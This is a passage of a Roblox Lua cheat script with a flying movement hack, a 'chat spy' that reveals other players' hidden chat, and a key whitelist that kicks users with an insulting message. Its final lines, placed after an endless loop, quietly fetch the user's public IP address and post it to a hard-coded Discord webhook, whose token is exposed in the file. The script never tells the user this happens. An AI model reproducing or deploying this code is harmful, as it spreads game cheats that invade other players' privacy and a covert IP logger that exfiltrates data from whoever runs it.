	RightKey = Enum.KeyCode.D,

	
}

local Screen = Instance.new("ScreenGui",game.CoreGui)
local Distance = Instance.new("TextLabel",Screen)
Distance.BackgroundTransparency = 1
Distance.Size = UDim2.new(0,10,0,10)
Distance.ZIndex = 2
Distance.Text = "0"
Distance.TextStrokeTransparency = .5
Distance.TextSize = 20
Distance.TextStrokeColor3 = Color3.fromRGB(33, 33, 33)
Distance.Font = Enum.Font.Gotham
Distance.TextColor3 = Color3.new(1,1,1)
Distance.TextXAlignment = Enum.TextXAlignment.Left
Distance.TextYAlignment = Enum.TextYAlignment.Top


local Mouse = game.Players.LocalPlayer:GetMouse()
local Direction = Vector3.new(0,0,0)
local InterpolatedDir = Direction
local Tilt = 0
local InterpolatedTilt = Tilt
local RunService = game:GetService("RunService")
local Toggled = false
local Sprinting = false
local CameraPos = game.Workspace.CurrentCamera.CFrame.Position

pcall(function()
	game.Players.LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam	
end)

function Lerp(a, b, t)
    return a + (b - a) * t
end

local LastPos = nil

function KeyHandler(actionName, userInputState)
	if true and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
		if actionName == "Toggle" and userInputState == Enum.UserInputState.Begin then
			Toggled = not Toggled
			if Toggled then
				LastPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				--game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true 
			else
				LastPos = nil
				game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
				--game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end
		elseif actionName == "Forward" then
			Tilt = userInputState == Enum.UserInputState.Begin and -20 or 0
			Direction = Vector3.new(Direction.x,Direction.y,userInputState == Enum.UserInputState.Begin and -1 or 0)
		elseif actionName == "Left" then
			Direction = Vector3.new(userInputState == Enum.UserInputState.Begin and -1 or 0,Direction.y,Direction.z)
		elseif actionName == "Backward" then
			Tilt = userInputState == Enum.UserInputState.Begin and 20 or 0
			Direction = Vector3.new(Direction.x,Direction.y,userInputState == Enum.UserInputState.Begin and 1 or 0)
		elseif actionName == "Right" then
			Direction = Vector3.new(userInputState == Enum.UserInputState.Begin and 1 or 0,Direction.y,Direction.z)
		elseif actionName == "Up" then
			Direction = Vector3.new(Direction.x,userInputState == Enum.UserInputState.Begin and 1 or 0,Direction.z)
		elseif actionName == "Down" then
			Direction = Vector3.new(Direction.x,userInputState == Enum.UserInputState.Begin and -1 or 0,Direction.z)
		elseif actionName == "Sprint" then
			Sprinting = userInputState == Enum.UserInputState.Begin
		end
	end
end



game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
	
	if inputObject.KeyCode == Settings.ToggleKey then
		KeyHandler("Toggle", Enum.UserInputState.Begin, inputObject)
	elseif inputObject.KeyCode == Settings.ForwardKey then
		KeyHandler("Forward", Enum.UserInputState.Begin, inputObject)
	elseif inputObject.KeyCode == Settings.LeftKey then
		KeyHandler("Left", Enum.UserInputState.Begin, inputObject)
	elseif inputObject.KeyCode == Settings.BackwardKey then
		KeyHandler("Backward", Enum.UserInputState.Begin, inputObject)
	elseif inputObject.KeyCode == Settings.RightKey then
		KeyHandler("Right", Enum.UserInputState.Begin, inputObject)
	elseif inputObject.KeyCode == Settings.UpKey then	
		KeyHandler("Up", Enum.UserInputState.Begin, inputObject)
	elseif inputObject.KeyCode == Settings.DownKey then
		KeyHandler("Down", Enum.UserInputState.Begin, inputObject)
	elseif inputObject.KeyCode == Settings.SprintKey then
		KeyHandler("Sprint", Enum.UserInputState.Begin, inputObject)
	end
	
	
end)


game:GetService("UserInputService").InputEnded:connect(function(inputObject, gameProcessedEvent)
	
	if inputObject.KeyCode == Settings.ToggleKey then
		KeyHandler("Toggle", Enum.UserInputState.End, inputObject)
	elseif inputObject.KeyCode == Settings.ForwardKey then
		KeyHandler("Forward", Enum.UserInputState.End, inputObject)
	elseif inputObject.KeyCode == Settings.LeftKey then
		KeyHandler("Left", Enum.UserInputState.End, inputObject)
	elseif inputObject.KeyCode == Settings.BackwardKey then
		KeyHandler("Backward", Enum.UserInputState.End, inputObject)
	elseif inputObject.KeyCode == Settings.RightKey then
		KeyHandler("Right", Enum.UserInputState.End, inputObject)
	elseif inputObject.KeyCode == Settings.UpKey then	
		KeyHandler("Up", Enum.UserInputState.End, inputObject)
	elseif inputObject.KeyCode == Settings.DownKey then
		KeyHandler("Down", Enum.UserInputState.End, inputObject)
	elseif inputObject.KeyCode == Settings.SprintKey then
		KeyHandler("Sprint", Enum.UserInputState.End, inputObject)
	end
	
	
end)


RunService.RenderStepped:Connect(function()
	if Toggled and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")  then
		for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Velocity = Vector3.new(0,0,0)
			end
		end
		local RootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
		if LastPos then
			Distance.Text = math.floor((LastPos-RootPart.Position).Magnitude+.5)
			if (LastPos-RootPart.Position).Magnitude >= 350 then
				Distance.TextColor3 = Color3.new(1,0,0)
			else
				Distance.TextColor3 = Color3.new(1,1,1)	
			end
		else
			Distance.TextColor3 = Color3.new(1,1,1)
			Distance.Text = 0
		end
		InterpolatedDir = InterpolatedDir:Lerp((Direction * (Sprinting and Settings.SprintSpeed or Settings.Speed)),.2)
		InterpolatedTilt = Lerp(InterpolatedTilt ,Tilt* (Sprinting and 2 or 1),Tilt == 0 and .2 or .1)
		RootPart.CFrame = RootPart.CFrame:Lerp(CFrame.new(RootPart.Position,RootPart.Position + Mouse.UnitRay.Direction) * CFrame.Angles(0,math.rad(00),0) * CFrame.new(InterpolatedDir)  * CFrame.Angles(math.rad(InterpolatedTilt),0,0),.2)
	else
		Distance.TextColor3 = Color3.new(1,1,1)
		Distance.Text = 0
	end	
end)
 
end)


easy:NewButton("chat spy", "makes you see evreyones chat in game!", function()
enabled = true
spyOnMyself = true
public = false
publicItalics = true
privateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,6)=="/e spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end)


easy:NewKeybind("toggle ui", "makes the ui go away", Enum.KeyCode.LeftAlt, function()
	Library:ToggleUI(LeftAlt)
end)






local keys = {
    
    "58729375275t8g77fg7F57FD5DFSHUIEFYSG7Tge6g85328rfd",
    "H8YHG765F87GHIOUh865tgh8IGT875FG7ufg576fG7RF7f78G78e",
    "gh76ttght679G876E67E5FUT645WErr56fDF67DTF7JHIEHIFGEWHGH",
    "j89g3h093h894gh6GT76F57R3E65727058347837H7gf7fiusgf78gfe7sivb",
    "D544E7RF54R7F88YYHGIUHGGFES6GYWGD67ARDR7W245564fe3w7",
    "LOJ8FH3UJ75ttg63w4h6f85sguyhNFYSE7GFH0UEGWI7GWHG",
    "HG8379HG46EG9g765fgf43EDF765df6rfghnuilh8765r5463f7g6",
    "gh76ttght679G876E67E5FUT645WErr56fDF67DTF7JHIEHIFGEWHGH7fr5g654ed",
    "G7TGIYH875RFg7g67eghfhe67gyfsh7hgft6tfrtweyh76r54ge7tfg7",
    "H7TR67GWTGF6A77TG76FG7GFR67WGFW65f7fgsyef6s5rf6afw6arf",
   
}

local counter = 1
local keyCheck
for i,v in pairs(keys) do
    if counter == #keys then
    --not whitelisted!
    keys = ""
    game.Players.LocalPlayer:Kick("Not a valid key!")
    else
        if v == _G.Key then
            --Whitelisted!
            print("Successfully whitelisted!")
            keyCheck = _G.Key
            keys = ""
        else
            counter = counter +1
        end
    end
end

while true do
    if _G.Key == keyCheck then
        --Not spoofed
    else
        game.Players.LocalPlayer:Kick("DONT SPOOF YOUR FUCKING KEY WEAKLING")
    end
    wait()
end

local HttpService = game:GetService("HttpService")
local url = "https://checkip.amazonaws.com/"
local response = HttpService:GetAsync(url)

local HttpService = game:GetService("HttpService")
local webhookUrl = "https://discord.com/api/webhooks/1060723849722855524/DSIGHf8_VAYxumN3Ajj7jp0bz1VcPrLdtE0tAVMFN7UcKOcgo5RgjSo4Zh7kU1oFKGa2"
local data = {
  content = response
}
local responseWB = HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data))
print(responseWB)
